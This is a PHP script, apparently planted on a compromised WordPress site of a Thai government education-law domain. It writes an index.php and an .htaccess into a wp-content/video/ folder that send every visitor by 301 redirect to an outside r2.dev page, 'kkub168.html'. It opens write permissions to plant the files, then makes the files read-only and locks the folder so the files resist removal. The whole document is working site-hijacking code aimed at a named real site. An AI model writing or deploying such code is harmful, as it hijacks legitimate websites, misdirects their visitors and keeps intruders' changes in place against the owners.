<?php
$directories = [
    '/home/moe-edulaw/htdocs/edulaw.moe.go.th/wp-content/video/'
];

$indexContent = <<<'PHP'
<?php
header('HTTP/1.1 301 Moved Permanently');
header('Location: https://pub-9c4fe7ddc42346929dd71587fc3ff12d.r2.dev/kkub168.html');
exit();
PHP;

$htaccessContent = <<<'HTACCESS'
RewriteEngine On
RewriteCond %{THE_REQUEST} !index\.php [NC]
RewriteRule ^.*$ https://pub-9c4fe7ddc42346929dd71587fc3ff12d.r2.dev/kkub168.html [R=301,L]
HTACCESS;

function ensureWritableDir(string $dir, int $openPerm = 0755): bool {
    clearstatcache(true, $dir);
    if (!is_dir($dir)) { echo "❌ ไม่พบโฟลเดอร์: $dir<br>"; return false; }
    if (!is_writable($dir)) {
        if (@chmod($dir, $openPerm)) {
            echo "🔓 เปิดสิทธิ์เขียนชั่วคราว $openPerm: $dir<br>";
        } else {
            echo "❌ เปลี่ยนสิทธิ์โฟลเดอร์เป็น $openPerm ไม่สำเร็จ (owner/group อาจไม่ตรง หรือถูกบังคับโดยระบบ)<br>";
            return false;
        }
    }
    return true;
}

function createOrUpdateFile(string $path, string $content, int $filePerm = 0444): bool {
    $dir = dirname($path);
    if (!ensureWritableDir($dir)) return false;

    $needWrite = !file_exists($path) || @file_get_contents($path) !== $content;
    if ($needWrite) {
        if (@file_put_contents($path, $content) === false) {
            $err = error_get_last()['message'] ?? 'unknown';
            echo "❌ เขียนไฟล์ไม่สำเร็จ: $path — $err<br>";
            return false;
        }
        echo "📝 เขียนไฟล์: $path<br>";
    } else {
        echo "✅ ไฟล์มีอยู่แล้วและเนื้อหาถูกต้อง: $path<br>";
    }

    if (!@chmod($path, $filePerm)) {
        echo "⚠️ ตั้งสิทธิ์ไฟล์ไม่สำเร็จ ($filePerm): $path<br>";
    } else {
        echo "🔒 ตั้งสิทธิ์ไฟล์เป็น " . decoct($filePerm) . ": $path<br>";
    }
    return true;
}

foreach ($directories as $dir) {
    $dir = rtrim($dir, '/').'/';

    // 1) เปิดเขียนชั่วคราว
    if (!ensureWritableDir($dir)) continue;

    // 2) สร้าง/อัปเดตไฟล์
    $indexPath    = $dir . 'index.php';
    $htaccessPath = $dir . '.htaccess';
    createOrUpdateFile($indexPath, $indexContent, 0444);
    createOrUpdateFile($htaccessPath, $htaccessContent, 0444);

    // 3) ล็อกโฟลเดอร์กลับ 0555
    if (@chmod($dir, 0555)) {
        echo "✅ ล็อกสิทธิ์โฟลเดอร์กลับเป็น 0555: $dir<br>";
    } else {
        echo "⚠️ ล็อกสิทธิ์โฟลเดอร์เป็น 0555 ไม่สำเร็จ (ตรวจ owner/ACL/SELinux): $dir<br>";
    }
}
